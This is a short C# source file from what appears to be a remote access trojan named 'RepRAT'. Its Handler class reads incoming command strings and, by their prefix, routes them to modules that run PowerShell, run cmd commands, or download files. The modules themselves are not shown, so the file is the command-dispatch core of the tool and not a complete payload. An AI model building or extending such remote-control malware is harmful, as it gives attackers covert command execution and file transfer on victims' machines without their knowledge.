using System.Diagnostics;

namespace RepRAT.Commands;

public class Handler
{
    public static void exec_command(string command)
    {
        var cmdPrefix = command.Split(" ")[0];
        if (cmdPrefix == "exec_powershell")
        {
            exec_powershell.Main.exec(command);
        }
        if (cmdPrefix == "exec_cmd")
        {
            exec_cmd.Main.exec(command);
        }
        if (cmdPrefix == "download_file")
        {
            download_file.Main.exec(command);
        }
    }
}